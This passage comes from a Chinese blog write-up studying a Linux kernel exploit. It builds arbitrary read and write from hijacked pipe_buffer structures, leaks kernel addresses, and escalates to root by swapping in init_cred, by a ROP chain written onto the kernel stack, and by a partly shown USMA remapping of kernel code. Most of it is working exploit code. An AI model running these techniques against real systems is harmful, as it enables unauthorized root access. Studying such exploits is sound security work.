class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="泄露信息"><a href="#泄露信息" class="headerlink" title="泄露信息"></a>泄露信息</h3><p>我们现在已经拥有了任意读写的能力</p><p>泄露kernel text</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span></span><br><span class="line"><span class="comment"> * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span></span><br><span class="line"><span class="comment"> * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span></span><br><span class="line"><span class="comment"> * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span></span><br><span class="line"><span class="comment"> * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vmemmap_base = (<span class="type">size_t</span>) info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">        kernel_base = buf[<span class="number">0</span>] -  <span class="number">0x070</span>;</span><br><span class="line">        kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">               kernel_base, kernel_offset);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br></pre></td></tr></table></figure><p>0x9d000/0x1000=157</p><p>至于开头那段注释,可能是我理解能力不够强,按照我的理解似乎是有点问题的</p><p><code>arttnba3</code>大佬提到kaslr的粒度是256m,但是<code>and pages of size 0x1000000 is 1GB MEM</code>中的<code>0x1000000</code>显然不是256m,之后的代码以及<code>just vmemmap_base -= 256MB</code>与之都对不上</p><hr><p>之后再在内存中搜索task结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For a machine with MEM less than 256M, we can simply get the:</span></span><br><span class="line"><span class="comment"> *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span></span><br><span class="line"><span class="comment"> * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span></span><br><span class="line"><span class="comment"> * So we need to find another way to calculate the page_offset_base.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Luckily the task_struct::ptraced points to itself, so we can get the</span></span><br><span class="line"><span class="comment"> * page_offset_base by vmmemap and current task_struct as we know the page.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Note that the offset of different filed should be referred to your env.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    comm_addr = memmem(buf, <span class="number">0xf00</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123;  <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">        current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">        page_offset_base = (comm_addr[<span class="number">-50</span>]&amp;<span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;<span class="comment">//直接映射区的首页</span></span><br><span class="line">        page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">               (<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">               page_offset_base);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">               <span class="string">&quot;0x%lx\n\n&quot;</span>, current_task);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>arttnba3</code>师傅提供了三种提权的方法,其中有两种并不常见</p><p>我们一一解读一下</p><h3 id="修改cred"><a href="#修改cred" class="headerlink" title="修改cred"></a>修改cred</h3><p>第一种是较为常见的修改当前进程的task_struct结构体,一般两种形式</p><ul><li>修改<code>task_struct-&gt;cred</code>为<code>&amp;init_cred</code></li><li>修改<code>task_struct-&gt;cred-&gt;uid和euid</code>为<code>0</code></li></ul><p>arttnba3大佬选择的是第一种方法</p><p>由于 <code>init_cred</code> 的符号有的时候是不在 <code>/proc/kallsyms</code> 中导出的(当然这题是导出了的)</p><p>所以大佬展示了一种方法,即通过解析 <code>task_struct</code> 不停的向上寻找父进程,直到找到<code>init</code>进程,<code>init</code>是所有进程的父进程,且其拥有<code>root</code>权限,当然cred就是<code>init_cred</code></p><p>将其保存并用以替换current_task的cred,以此提权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">        tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) ptask_page_addr, buf);</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (ptask_page_addr+<span class="number">0x40</span>),&amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">        <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init_task = parent_task;</span><br><span class="line">    init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">    init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>),</span><br><span class="line">                            &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后个人自己实现了一下第二种方法,直接修改uid和euid为0,思路更直接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llu\n&quot;</span>,cred_page);</span><br><span class="line"><span class="type">int</span> offset=cred_page&amp;<span class="number">0xfff</span>;</span><br><span class="line">   cred_page=direct_map_addr_to_page_addr(cred_page);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">   evil_2nd_buf.page = cred_page;</span><br><span class="line">   evil_2nd_buf.offset = offset+<span class="number">4</span>;</span><br><span class="line">   evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> src[<span class="number">24</span>];</span><br><span class="line"><span class="built_in">memset</span>(src,<span class="number">0</span>,<span class="number">24</span>);</span><br><span class="line"><span class="type">int</span> len=<span class="number">24</span>;</span><br><span class="line">   <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">   write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">         temp_zero_buf, </span><br><span class="line">         TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* write data into dst page */</span></span><br><span class="line">   write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line">   get_root_shell();</span><br></pre></td></tr></table></figure><h3 id="覆写内核栈"><a href="#覆写内核栈" class="headerlink" title="覆写内核栈"></a>覆写内核栈</h3><p>覆写内核栈实现rop自然不是什么少见的利用手法,但是这里<code>arttnba3</code>大佬找到内核栈的方法还是第一次见</p><p>学习一下</p><blockquote><p> 由于 page 结构体数组与物理内存页一一对应的缘故，我们可以很轻易地在物理地址与 page 结构体地址间进行转换，而在页表当中存放的是物理地址，我们不难想到的是<strong>我们可以通过解析当前进程的页表来获取到内核栈的物理地址，从而获取到内核栈对应的 page</strong>，之后我们可以<strong>直接向内核栈上写 ROP chain 来完成任意代码执行</strong></p><p>页表的地址可以通过 <code>mm_struct</code> 获取， <code>mm_struct</code> 地址可以通过 <code>task_struct</code> 获取，内核栈地址同样可以通过 <code>task_struct</code> 获取，那么这一切其实是水到渠成的事情：</p></blockquote><p>简单来说就是获取栈对应的<code>page</code>,然后在页上布置gadget</p><p>因为栈上是ret调用gadget,所以绕过了CFI</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_rop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>], idx = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* reading the page table directly to get physical addr of kernel stack*/</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);</span><br><span class="line">    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="comment">/* N/X bit */</span></span><br><span class="line">    stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct the ROP */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++) &#123;</span><br><span class="line">        rop[idx++] = RET + kernel_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="number">54</span> + kernel_offset;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_root_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br></pre></td></tr></table></figure><p>虽然<code>arttnba3</code>大佬选择自己重新解析stack的地址stack_addr_another,但实际上直接使用stack_addr也是能够成功的</p><h4 id="虚拟地址翻译"><a href="#虚拟地址翻译" class="headerlink" title="虚拟地址翻译"></a>虚拟地址翻译</h4><p>虽然5级页表也已经挺成熟了,但现在大多数的x86机器依然是4级页表</p><p>即<code>pgd,pud,pmd,pte</code>,四级页表只使用48位,除去12位的页内偏移,剩下的36位,四级页表平分各9位</p><p>kernel pwn中遇到的也主要是四级页表</p><p>我们知道cr3寄存器存储的是pgd基址的物理内存地址,每个进程都有自己的页表,在上下文切换时,当前进程的cr3寄存器会被存入<code>task_struct-&gt;mm-&gt;pgd</code>,不过存的并不是物理地址,而是pgd在直接映射区的地址,当然<strong>直接映射区的地址减去<code>page_offset_base</code>就是物理内存地址了</strong></p><p>一般来说,一个页表有512个条目,每个条目占8字节,也就是说一个页表刚好占据一个页框,除pgd只有一个页表外,剩下的三级页表可能都会有多个页表</p><p><code>pgd,pud,pmd</code>前三级页表条目的组成如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/clipboard.png" alt=""></p><p><code>pte</code>的页表条目如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/clipboard%202.png" alt=""></p><p>PTE 有三个权限位，控制对页的访问。R/W 控制是只读还是读写；U/S 控制用户模式是否可以访问；XD 用来禁止从某些页读指令。</p><p>每次访问一个页，MMU 都会设置 A 位，称为引用位。内核可以利用这个引用位实现它的页替换算法。</p><p>每次写了一个页后，MMU 都会设置 D 位，称为修改位。修改位告诉内核在替换该页前是否必须写回牺牲页。</p><p>内核可以通过调用一条特殊的内核模式指令来清除引用位或修改位</p><p><strong>特别注意:</strong>在<code>pmd</code>表中,其页表项可能会置<code>PS</code>位,这代表<strong>不存在第四级页表<code>pte</code></strong>,而是将<code>pmd</code>表项的物理基地址对应物理内存直接当做一个大页,虚拟地址的后21位当作偏移,此外虽然上图显示是<code>4M</code>页,但实际上因为只剩下了21位,所以实际上是<code>2M</code>页,在内核页表中页表项物理基址也确实是以<code>2M</code>为单位增加的</p><p><code>大页pmd:(基址增加单位2m)</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0xffff9480c0000000+0xa202000+22*8</span><br><span class="line">00:0000│  0xffff9480ca2020b0 ◂— 0x8000000002c000e3</span><br><span class="line">01:0008│  0xffff9480ca2020b8 ◂— 0x2e29063</span><br><span class="line">02:0010│  0xffff9480ca2020c0 ◂— 0x80000000030000e3</span><br><span class="line">03:0018│  0xffff9480ca2020c8 ◂— 0x80000000032000e3</span><br><span class="line">04:0020│  0xffff9480ca2020d0 ◂— 0x80000000034000e3</span><br><span class="line">05:0028│  0xffff9480ca2020d8 ◂— 0x80000000036000e3</span><br><span class="line">06:0030│  0xffff9480ca2020e0 ◂— 0x80000000038000e3</span><br><span class="line">07:0038│  0xffff9480ca2020e8 ◂— 0x8000000003a000e3</span><br></pre></td></tr></table></figure><p><code>4k页pmd:</code>(基址增加单位4k)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0xffff9480c0000000+0x2a4f000+268*8</span><br><span class="line">00:0000│  0xffff9480c2a4f860 ◂— 0x8000000002d70063 /* <span class="string">&#x27;c&#x27;</span> */</span><br><span class="line">01:0008│  0xffff9480c2a4f868 ◂— 0x8000000002d71063</span><br><span class="line">02:0010│  0xffff9480c2a4f870 ◂— 0x8000000002d72063</span><br><span class="line">03:0018│  0xffff9480c2a4f878 ◂— 0x8000000002d73063</span><br></pre></td></tr></table></figure><h3 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h3><p>解析目标内核代码物理地址paddr</p><p>用户mmap映射一段虚拟地址vaddr,然后劫持vaddr的页表的pte表项为paddr</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_usma</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *kcode_map, *kcode_func;</span><br><span class="line">    <span class="type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    kcode_map = mmap((<span class="type">void</span>*) <span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, </span><br><span class="line">                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!kcode_map) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* because of lazy allocation, we need to write it manually */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        kcode_map[i] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">        kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code seg to exec shellcode directly :) */</span></span><br><span class="line">    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">           dst_vaddr);</span><br><span class="line"></span><br><span class="line">    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);</span><br><span class="line">    dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* remapping to our mmap area */</span></span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span>, dst_paddr);</span><br><span class="line">    